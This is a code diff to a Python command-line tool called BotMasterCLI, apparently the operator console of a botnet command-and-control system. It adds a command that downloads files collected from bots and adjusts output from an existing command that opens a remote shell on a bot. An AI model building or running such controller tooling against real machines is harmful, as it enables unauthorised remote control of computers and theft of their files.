@@ -106,6 +106,24 @@ class BotMasterCLI(cmd.Cmd):
         response = requests.get(url + "/bots")
         print(response.json())
 
+    def do_download_from_server(self, args):
+        """Download a file from the server (Args: objective, filename)"""
+        args_vec = parse_args(args)
+        if len(args_vec) < 2:
+            print("Usage: download_from_server objective, filename")
+        else:
+            objective = args_vec[0]
+            filename = args_vec[1]
+            response = requests.get(url + f"/download?objective={objective}&filename={filename}")
+            print(response.json())
+            directory = f"downloads"
+            try:
+                os.makedirs(directory, exist_ok=True)
+                with open(directory + "/" + filename, 'w') as file:
+                    file.write(response.json()["data"])
+            except Exception as e:
+                print(f"An error occurred: {e}")
+
     def do_shell(self, args):
         """Create a shell in a bot (Args: objective)"""
         args_vec = parse_args(args)
@@ -132,7 +150,8 @@ class BotMasterCLI(cmd.Cmd):
 
                     websocket.send(json_data)
                     message = websocket.recv()
-                    print(message)
+                    string_data = message.decode('utf-8')
+                    print(string_data)
                     # Check if the user wants to quit
 
 
